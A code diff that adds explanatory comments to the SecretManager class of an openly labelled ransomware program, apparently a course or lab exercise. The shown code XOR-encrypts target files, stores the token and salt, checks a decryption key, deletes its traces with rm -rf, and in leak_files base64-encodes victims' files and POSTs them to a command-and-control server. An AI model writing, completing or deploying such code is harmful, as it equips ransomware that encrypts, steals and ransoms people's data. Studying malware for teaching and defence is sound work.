@@ -96,14 +96,19 @@ class SecretManager:
         # we can display the returned status_code to check that everything worked
         self._log.debug("post_new request returned with code " + str(post_status_code))
         
+        # creating a root/token directory with erro handling
         token_path = f"{self._path}/token"
-        if not Path(token_path).exists():  
+        if not Path(token_path).exists():
+            # mkdir -p root/token if it does not already exist
             Path(token_path).mkdir(parents=True, exist_ok=False)
+
+        # checking that the token file does not exist in case the malware wanted to overwrite it
         if Path(f"{token_path}/token.bin").exists():
             raise FileExistsError
         
         # open taking parameter 'wb' allows the program to write into a binary file
         
+        # writing token and salt to binary files
         with open(f"{token_path}/token.bin", 'wb') as token_binary_file:
             token_binary_file.write(self._token)
         with open(f"{token_path}/salt.bin", 'wb') as salt_binary_file:
@@ -114,6 +119,7 @@ class SecretManager:
     def xorfiles(self, files: List[str]) -> None:
         # xor a list for file
         logging.debug("XORFILE FUNCTION")
+        # simple call to xorfile on every single file provided
         [xorfile(file, self._key) for file in files]
         return None
 
@@ -123,15 +129,20 @@ class SecretManager:
         token_digest.update(self._token)
         hashed_token = token_digest.finalize()
         
+        # essentially, the token is hashed, made a number from bin to decimal, then to hex and the turned into a string without the '0x' prefix
         return str(hex(int.from_bytes(hashed_token)))[2:-1]
 
     
     def load(self) -> None:
         # function to load crypto data
         token_path = f"{self._path}/token"
+        # opening file holding the binary encoded token
         with open(f"{token_path}/token.bin", 'rb') as token_file:
+            # reading it
             self._token = token_file.read()
             self._log.debug(self._token)
+        
+        # same with the salt
         with open(f"{token_path}/salt.bin", 'rb') as salt_file:
             self._salt = salt_file.read()
             self._log.debug(self._salt)
@@ -140,19 +151,22 @@ class SecretManager:
 
     def check_key(self, candidate_key: bytes) -> bool:
         # Assert the key is valid
+        # calculating a token candidate based on the provided candidate key and self._salt
         token_candidate = self.do_derivation(self._salt, candidate_key)
+        # comparing both tokens
         key_is_valid = (token_candidate == self._token)
         return key_is_valid
 
     def set_key(self, b64_key: str) -> bool:
         # If the key is valid, set the self._key var for decrypting
-        # decoding the key entered by the user. The try/except is meant to prevent errors if the key is not 
+        # decoding the key entered by the user. The try/except is meant to prevent errors if the key is not of the right encoding or length (simple 'shunt'-like return) 
         try:
             candidate_key = base64.b64decode(b64_key)
         except:
             return False
-        
         self._log.debug(candidate_key)
+        
+        # checking the key validity
         if not self.check_key(candidate_key):
             return False 
         self._key = candidate_key
@@ -165,13 +179,16 @@ class SecretManager:
         # remove ransomware and crypto data from the target
         system(f"rm -rf {self._path}/token")
         system(f"rm -rf {install_path}")
-    
+        # simply removing using bash instructions 
         return None
 
     def leak_files(self, files: List[str]) -> None:
-        # send file, genuine path and token to the CNC
+        # send files to the CNC
+        # using hashed token filepath
         dir_label = self.get_hex_token()
+        # creating destination URL
         folder_url = f"http://{self._remote_host_port}/file?label={dir_label}"
+        # setting POST header
         header = {
                 "Content-Type":"application/json"
                 }
@@ -180,8 +197,10 @@ class SecretManager:
                 # requests.post(file_url, files={f'f': f}, headers=header)
                 file_data = self.bin_to_b64(f.read())
                 file_json = {
+                        # file name without parent directories in its path (relative path, in essence)
                         "file_name": file.rsplit('/', 1)[-1],
                         "file_data": file_data
                         }
+                # POST request
                 requests.post(folder_url, json=file_json, headers=header)
         return None
